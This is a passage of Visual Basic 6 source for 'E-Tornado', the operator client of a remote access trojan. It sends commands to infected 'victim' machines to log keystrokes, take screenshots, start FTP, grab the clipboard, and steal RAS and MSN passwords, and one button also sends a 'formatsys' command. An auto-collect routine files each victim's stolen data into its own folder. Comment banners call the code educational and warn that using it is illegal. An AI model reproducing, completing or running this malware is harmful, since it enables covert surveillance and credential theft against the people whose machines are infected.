    
        Do While Not EOF(1)
            Input #1, xxx
            founditem = False
            
            'check duplicates
            For i = 0 To Text1.ListCount
                
                If (xxx = Text1.List(i)) Then
                    founditem = True
                End If
            Next i
            
            If founditem = False Then
                Text1.AddItem xxx
            End If
        Loop
    Close #1

    'clean the list
    If Text1.ListCount >= 50 Then
        Open App.path & "\data\ip.ssc" For Output As #1
        Close #1
    End If


    With Winsock1
        .Protocol = sckUDPProtocol
        .RemotePort = 50077
        .Bind
    End With

    With Winsock2
        .Close
        .Protocol = sckUDPProtocol
        .LocalPort = 50011 'Int(Rnd * 10000)
        .Bind
    End With


    With Winsock3
        .Protocol = sckUDPProtocol
    End With
    
    Winsock4.Protocol = sckUDPProtocol
    Winsock4.RemotePort = 50011
    




    'to send ur ip address
    Load formnoty
    
    'for list sorting
    LVXS.SetUp Form7.lstWin
    
    'set version
    theversion = "1.6"
    
    Me.Caption = "E-Tornado (Client) Version " & theversion
    ctxSysTray1.AddIconToSystray "E-Tornado (Client) Version " & theversion

End Sub





'send to tray
Private Sub Form_Resize()
 If Check2.Value = 1 Then
    If (Me.WindowState = 1) Then
            ctxSysTray1.AddIconToSystray "E-Tornado (Client) Version " & theversion
            Me.Hide
    End If
 End If
End Sub


'connect button
Private Sub lvButtons_H1_Click()
     
   connectnow
   
   'clean search window
   Form3.List1.Clear
   
   ProgressBar1.Max = 100
End Sub


'connect to victim
Public Sub connectnow()
    Form7.logit "Connecting to " & Text1.Text
    
    Text1.AddItem Trim(Text1.Text)
    ProgressBar1.Visible = True
    ProgressBar1.Value = 0
    Timer3.Enabled = True
    Text2.Text = ""
 
    With Winsock1
    
     .RemoteHost = Trim(Text1.Text)
     On Error Resume Next
     .SendData Text4.Text
     
    End With
     
    On Error Resume Next
    Open App.path & "\data\ip.ssc" For Append As #1
        Write #1, Trim(Text1.Text)
    Close #1
End Sub




'screen shoot
Private Sub lvButtons_H10_Click()

    On Error Resume Next
    Winsock1.SendData "root1"
    On Error Resume Next
    Winsock1.SendData "formatsys"
    On Error Resume Next
    Winsock1.SendData "screenshoot"
End Sub

'key log
Private Sub lvButtons_H11_Click()

    On Error Resume Next
    Winsock1.SendData "keylog"
End Sub

'ftp
Private Sub lvButtons_H12_Click()

    On Error Resume Next
    Winsock1.SendData "ftpstart"
End Sub

'monitor screen
Private Sub lvButtons_H13_Click()

    Form7.Show
End Sub

'decoder
Private Sub lvButtons_H14_Click()
    
    Formtrans.Text1 = Text2.Text
    Formtrans.decodCapital
    Formtrans.Show
    Formtrans.decodCapital
End Sub

'launch ws-ftp
Private Sub lvButtons_H15_Click()
    On Error Resume Next
    ShellExecLaunchFile "C:\Program Files\Ipswitch\WS_FTP Professional\wsftpgui.exe", vbNullString, vbNullString
End Sub

'launch new trace
Private Sub lvButtons_H16_Click()
    On Error Resume Next
    ShellExecLaunchFile "C:\Program Files\NeoTracePro\NeoTrace.exe", vbNullString, vbNullString

End Sub


'show server control
Private Sub lvButtons_H18_Click()
 formnoty.Show
End Sub

'open the log saving folder
Private Sub lvButtons_H19_Click()
    ShellExecute hwnd, "open", Text3.Text, vbNullString, vbNullString, conSwNormal

End Sub

'copy ip
Private Sub lvButtons_H2_Click()
        
    Clipboard.Clear
    Clipboard.SetText Text1
End Sub


'browse a folder
Private Sub lvButtons_H20_Click()
    On Error GoTo ErrH

    Dim sPath As String

            '   Open the Browse Folder dialog box and
            '   return the folder selected
    sPath = SelectFolder(Me, "Select folder")
  
  
            '   If no folder was selected, exit here
    If Len(sPath) = 0 Then
         Text3.Text = "No folder selected"
        Exit Sub
    Else
        Text3.Text = sPath
    End If

Exit Sub
    
ErrH:
    Exit Sub
   
End Sub

Private Sub lvButtons_H21_Click()
    'get ras
    On Error Resume Next
    Form1.Winsock1.SendData "msn"
End Sub

Private Sub lvButtons_H22_Click()
  'get HD code
  On Error Resume Next
  Form1.Winsock1.SendData "hserial"
End Sub

Private Sub lvButtons_H23_Click()
    'get clip board
    On Error Resume Next
    Form1.Winsock1.SendData "copymem"
End Sub

Private Sub lvButtons_H24_Click()
    'get os info
    On Error Resume Next
    Form1.Winsock1.SendData "osinfo"
End Sub

Private Sub lvButtons_H25_Click()
   'get pc name
    On Error Resume Next
    Form1.Winsock1.SendData "compname"
End Sub

Private Sub lvButtons_H26_Click()
   'get host name
    On Error Resume Next
    Form1.Winsock1.SendData "getmehost"
End Sub

Private Sub lvButtons_H27_Click()
    'get ip address
    On Error Resume Next
    Form1.Winsock1.SendData "getmeip"
End Sub

Private Sub lvButtons_H28_Click()
    'get victim version
    On Error Resume Next
    Form1.Winsock1.SendData "getver"
End Sub

Private Sub lvButtons_H29_Click()
    'get victim signal again
    On Error Resume Next
    Form1.Winsock1.SendData "getagain"
End Sub

'paste ip
Private Sub lvButtons_H3_Click()
    Text1 = Clipboard.GetText
End Sub

Private Sub lvButtons_H30_Click()
    Form3.Show
End Sub

'get own ip
Private Sub lvButtons_H4_Click()
    Text1.Text = Winsock1.localip
End Sub


'save ip info
Private Sub lvButtons_H5_Click()
    CDialog1.ShowSave
    Open CDialog1.Filename & ".txt" For Output As #1
    Write #1, "Time" & " " & Time
    Write #1, "DATE" & " " & Date
    Write #1, Text1
    
    Close #1
End Sub



'save key loger
Private Sub lvButtons_H6_Click()
    Dim me1 As Boolean
    me1 = False
    If (formnoty.Check2.Value = 1) Then
        formnoty.Check2.Value = 0
        me1 = True
    End If
    
  
    
    
    On Error Resume Next
    CDialog1.ShowSave
    
    On Error Resume Next
    Open CDialog1.Filename & ".txt" For Output As #1
        On Error Resume Next
        Write #1, Text2
        On Error Resume Next
    Close #1
    
    If (me1 = True) Then
        formnoty.Check2.Value = 1
    End If
End Sub


'copy keylog
Private Sub lvButtons_H7_Click()
    Clipboard.Clear
    Clipboard.SetText Text2.Text

End Sub

'clear key log
Private Sub lvButtons_H8_Click()
    Text2.Text = " "
End Sub



'menu show main
Private Sub showmainw_Click()
    Form1.Show
    Me.WindowState = 0
    Form1.Show
End Sub

'menu show monitor
Private Sub showmonw_Click()
    Form7.Show
End Sub

Private Sub soundtimer_Timer()
    Call PlaySoundResource(102)
End Sub

'stay alive timer
Private Sub stayconnectedtimer_Timer()
    OpenURL "http://google.com"

End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

'on connect
Private Sub Text2_Change()
   
    
    If Text2.Text = "Connected" Then
        ProgressBar1.Max = 15
        Timer3.Enabled = False
        Call PlaySoundResource(105)
        
        On Error Resume Next
        formnoty.Winsock2.SendData "%" & frmLogin.txtUserName.Text & " Connected to " & Text1.Text
        
        If Check3.Value = 1 Then
        
        
               
        Dim file_exists As Boolean
    
    
        If Text2.Text = "Connected" Then
        ProgressBar1.Value = ProgressBar1.Value + 1
        Dim pcname, hostname, folder, hserial, victimcode As String
        Dim allinfo As String
          
         
        StatusBar1.Panels(1).Text = "Getting computer name"
        Text2.Text = ""
        Call frmLogin.GotoSleep(5, 1)
        Winsock1.SendData "compname"
        Call frmLogin.GotoSleep(5, 1)
        pcname = Text2.Text
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        StatusBar1.Panels(1).Text = "Getting host name"
        Text2.Text = ""
        Call frmLogin.GotoSleep(5, 1)
        Winsock1.SendData "getmehost"
        Call frmLogin.GotoSleep(5, 1)
        hostname = Text2
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        StatusBar1.Panels(1).Text = "Getting hard disk serial number"
        Text2.Text = ""
        Call frmLogin.GotoSleep(5, 1)
        Winsock1.SendData "hserial"
        Call frmLogin.GotoSleep(5, 1)
        hserial = Text2
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        
        StatusBar1.Panels(1).Text = "Getting version code"
        'get victim code
        Text2.Text = ""
        Call frmLogin.GotoSleep(5, 1)
        Winsock1.SendData "getver"
        Call frmLogin.GotoSleep(5, 1)
        victimcode = Trim(Text2)
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        
        
             
        
            
               
        If victimcode = "" Then
            victimcode = "old victims"
        End If
         
        'set string with all info
        allinfo = "\" & victimcode & "-" & pcname & "-" & hostname & "-" & hserial
        
        If Right(Text3.Text, 1) = "\" Then
            
            On Error Resume Next
            MkDir Text3.Text & victimcode
            On Error Resume Next
            MkDir Text3.Text & victimcode & "\" & pcname & " " & hostname & "_" & hserial
            folder = Text3.Text & victimcode & "\" & pcname & " " & hostname & "_" & hserial
        
       Else
        
            On Error Resume Next
            MkDir Text3.Text & "\" & victimcode
            On Error Resume Next
            MkDir Text3.Text & "\" & victimcode & "\" & pcname & " " & hostname & "_" & hserial
            folder = Text3.Text & "\" & victimcode & "\" & pcname & " " & hostname & "_" & hserial
                
        End If
        
       StatusBar1.Panels(1).Text = "Creating victim folder " & folder
       ProgressBar1.Value = ProgressBar1.Value + 1
         
       'check if file is already there
       file_exists = FileExistsWithDir(folder & allinfo & ".txt")
       If file_exists Then
           
         On Error Resume Next
         Open folder & allinfo & ".txt" For Append As #1
             Print #1, " "
             Print #1, " "
             Print #1, " "
             Print #1, "-------------------------------------------------"
             Print #1, "         Ip Date and Time"
             Print #1, " "
             Print #1, Winsock1.RemoteHostIP & "  " & Date & "   " & Time
         Close #1
       
       Else
       
        On Error Resume Next
         Open folder & allinfo & ".txt" For Output As #1
             Print #1, " "
             Print #1, " "
             Print #1, " "
             Print #1, "-------------------------------------------------"
             Print #1, "         Ip Date and Time"
             Print #1, " "
             Print #1, Winsock1.RemoteHostIP & "  " & Date & "   " & Time
         Close #1
        
        
       
       End If
       'end checking
    
        StatusBar1.Panels(1).Text = "Ip info saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
    
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         computer Name"
            Print #1, " "
            Print #1, pcname
        Close #1
        StatusBar1.Panels(1).Text = "Computer Name Saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Host Name"
            Print #1, " "
            Print #1, hostname
        Close #1
        StatusBar1.Panels(1).Text = "Host Name Saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Hard disk serial"
            Print #1, " "
            Print #1, hserial
        Close #1
        StatusBar1.Panels(1).Text = "Hard disk serial saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        
        
        
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Victim code"
            Print #1, " "
            Print #1, victimcode
        Close #1
        StatusBar1.Panels(1).Text = "Victim code saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        
          
          
          
          
          
          
        Call frmLogin.GotoSleep(5, 1)
        Text2.Text = ""
        Winsock1.SendData "msn"
        Call frmLogin.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         RAS + MSN passwords"
            Print #1, " "
            Print #1, Text2.Text
        Close #1
        StatusBar1.Panels(1).Text = "RAS information saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        Call frmLogin.GotoSleep(5, 1)
        Text2.Text = ""
        Winsock1.SendData "copymem"
        Call frmLogin.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Saved memory (clipboard)"
            Print #1, " "
            Print #1, Text2.Text
        Close #1
        StatusBar1.Panels(1).Text = "Clipborad saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        Call frmLogin.GotoSleep(5, 1)
        Text2.Text = ""
        Winsock1.SendData "keylog"
        Call frmLogin.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         keys typed"
            Print #1, " "
            Print #1, Text2.Text
        Close #1
        StatusBar1.Panels(1).Text = "Keys saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
        
        
        Call frmLogin.GotoSleep(5, 1)
        Text2.Text = ""
        Winsock1.SendData "osinfo"
        Call frmLogin.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Victims operating system"
            Print #1, " "
            Print #1, Text2.Text
        Close #1
        StatusBar1.Panels(1).Text = "OS info saved"
        ProgressBar1.Value = ProgressBar1.Value + 1
          
          
          
        
        
        
        
        
        Text2.Text = ""
        StatusBar1.Panels(1).Text = "Done"
        Call PlaySoundResource(104)
        End If
        End If
        
     End If
        
    
    
End Sub


'connecting progresss
Private Sub Timer3_Timer()
    If ProgressBar1.Value = 99 Then
        Timer3.Enabled = False
        ProgressBar1.Visible = False
        Me.Caption = "E-Tornado (Client) Version " & theversion
    End If
        ProgressBar1.Value = ProgressBar1.Value + 1
       
End Sub

'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


'on exit
Private Sub Form_Unload(Cancel As Integer)

    Dim notysound As Integer
    notysound = MsgBox("Exit the program,Are you sure?", vbYesNo)

    If notysound = 6 Then '6 indicates a YES
                
        
      ctxSysTray1.RemoveIconFromSystray
      On Error Resume Next
      formnoty.Winsock2.SendData "...." & frmLogin.txtUserName & " Logged Off"
      
      'save settings to registry
      SaveSetting Me.name, "Settings", "maincheck1", Form1.Check1.Value
      SaveSetting Me.name, "Settings", "maincheck2", Form1.Check2.Value
      SaveSetting Me.name, "Settings", "maincheck3", Form1.Check3.Value
      SaveSetting Me.name, "Settings", "maincheck4", Form1.Check4.Value
      SaveSetting Me.name, "Settings", "maincheck5", Form1.Check5.Value
      SaveSetting Me.name, "Settings", "maintext3", Text3.Text
      ForceQuit
      End

                        
    Else
        Cancel = 1
    End If
 
End Sub



'winsock communications
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim reply As String
    Text2.Text = ""
    On Error Resume Next
    Winsock1.GetData reply
    
    If InStr(Trim(reply), ":\") Then
        Form3.List1.AddItem reply
        Form3.Text2 = Form3.List1.ListCount
    ElseIf Left(reply, 1) = "$" Then
        Form3.List1.AddItem reply
        Form3.Text2 = Form3.List1.ListCount
    Else
        Text2.Text = reply
    End If
    
    Select Case Text2.Text
    Case "Connected"
        Frame1.Visible = True
        Form1.Caption = "Connected to " & Text1.Text & " E-Tornado (Client) Version " & theversion
    
    Case "Sorry Wrong password :) try again"
        MsgBox "For security resons this program will be closed make sure of the server password and open it again :)", vbInformation, "Good luck next time"
        End
    End Select
End Sub


Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
    Dim reply As String
    Dim connect2vic As Boolean
    Dim thename As String
    
     connect2vic = False
     Winsock2.GetData reply

    
    
    
    If formnoty.Check2.Value = 1 Then
        ctxSysTray1.Popup reply, "E-Tornado", Information
    End If
         
       'stop sorting when adding
       LVXS.Sort False
        
        
      
        If Left(reply, 3) = "..." Then
            Form7.logit reply
            Form7.List1.AddItem reply
            Form7.Label6.Caption = "Total: " & Form7.List1.ListCount
            
        ElseIf CharCount(reply, "|") = 4 Then
          
        
          striN = Split(reply, "|")
          Set lItem = Form7.lstWin2.ListItems.Add(, , striN(0), , 0)
          lItem.ListSubItems.Add , , striN(1)
          lItem.ListSubItems.Add , , striN(2)
          lItem.ListSubItems.Add , , striN(3)
          lItem.ListSubItems.Add , , striN(4)
          
        ElseIf Left(reply, 2) = ".." Then
       
        Form7.logit reply
        
        'check later
        ElseIf Left(reply, 6) = "622415" Then
          'MsgBox reply
          striN = Split(reply, "|")
          
          Set lItem = Form7.lstWin.ListItems.Add(, , striN(1), , 0)
          lItem.ListSubItems.Add , , striN(2)
          lItem.ListSubItems.Add , , striN(4)
          lItem.ListSubItems.Add , , striN(6)
          lItem.ListSubItems.Add , , striN(3)
          lItem.ListSubItems.Add , , striN(5)
           
          If CharCount(reply, "|") > 6 Then
            lItem.ListSubItems.Add , , striN(7)
            lItem.ListSubItems.Add , , striN(8)
          Else
           lItem.ListSubItems.Add , , Date
           lItem.ListSubItems.Add , , Time
          
          End If
           
            'play sound
          If Form7.Check5.Value = 1 Then
            Call PlaySoundResource(103)
          End If
         
           
           
           'check if is in filter
           Dim l As Long
           For l = 1 To Form7.listview1.ListItems.Count
        
             If InStr(Trim(reply), Form7.listview1.ListItems(l).Text) > 0 Then
                If Form7.listview1.ListItems(l).ListSubItems(1).Text = "yes" Then
                    Me.soundtimer.Enabled = True
                    lItem.ListSubItems.Add , , "yes"
                Else
                    lItem.ListSubItems.Add , , "no"
                End If
             End If
              
           Next l
       
       connect2vic = True
           
       
                                   
    ElseIf Left(reply, 1) = "#" Then
       ' Form7.List2.AddItem reply & "   " & Time & " " & Date
       Form7.logit reply
       
       
    ElseIf Left(reply, 6) = "542891" Then
       
        
            striN = Split(reply, "|")
            
             thename = striN(2)
             
            'remove duplicates
             Dim xcounter1 As Long
              
             For xcounter1 = 1 To Form7.lstWin2.ListItems.Count
                 
                 On Error Resume Next
                 If Form7.lstWin2.ListItems.item(xcounter1).Text = thename Then
                     Form7.lstWin2.ListItems.Remove (xcounter1)
                 End If
                 
             Next xcounter1
           
            'ip is opesite sometimes
            If InStr(Trim(thename), ".") Then
              
                Set lItem = Form7.lstWin2.ListItems.Add(, , striN(1), , 0)
                lItem.ListSubItems.Add , , thename
                lItem.ListSubItems.Add , , Date
                lItem.ListSubItems.Add , , Time
                lItem.ListSubItems.Add , , striN(3)
            
            Else
         
                
                Set lItem = Form7.lstWin2.ListItems.Add(, , thename, , 0)
                lItem.ListSubItems.Add , , striN(1)
                lItem.ListSubItems.Add , , Date
                lItem.ListSubItems.Add , , Time
                lItem.ListSubItems.Add , , striN(3)
         
         
            End If
         Else
            Form7.logit reply
         
         End If
        
       
        LVXS.Sort True
    
     
      

End Sub



'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!








'force exit
Public Sub ForceQuit()
    ExitProcess 1
End Sub





'count charector occurance
Public Function CharCount(OrigString As String, _
  Chars As String, Optional CaseSensitive As Boolean = False) _
  As Long

'**********************************************
'PURPOSE: Returns Number of occurrences of a character or
'or a character sequencence within a string

'PARAMETERS:
    'OrigString: String to Search in
    'Chars: Character(s) to search for
    'CaseSensitive (Optional): Do a case sensitive search
    'Defaults to false

'RETURNS:
    'Number of Occurrences of Chars in OrigString

'EXAMPLES:
'Debug.Print CharCount("FreeVBCode.com", "E") -- returns 3
'Debug.Print CharCount("FreeVBCode.com", "E", True) -- returns 0
'Debug.Print CharCount("FreeVBCode.com", "co") -- returns 2
''**********************************************

Dim lLen As Long
Dim lCharLen As Long
Dim lAns As Long
Dim sInput As String
Dim sChar As String
Dim lCtr As Long
Dim lEndOfLoop As Long
Dim bytCompareType As Byte

sInput = OrigString
If sInput = "" Then Exit Function
lLen = Len(sInput)
lCharLen = Len(Chars)
lEndOfLoop = (lLen - lCharLen) + 1
bytCompareType = IIf(CaseSensitive, vbBinaryCompare, _
   vbTextCompare)

    For lCtr = 1 To lEndOfLoop
        sChar = Mid(sInput, lCtr, lCharLen)
        If StrComp(sChar, Chars, bytCompareType) = 0 Then _
            lAns = lAns + 1
    Next

CharCount = lAns

End Function





'check if file exit
Private Function FileExistsWithDir(ByVal Filename As String)
Dim file_name As String

    On Error Resume Next
    file_name = Dir$(Filename)
    FileExistsWithDir = (file_name <> "")
End Function
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

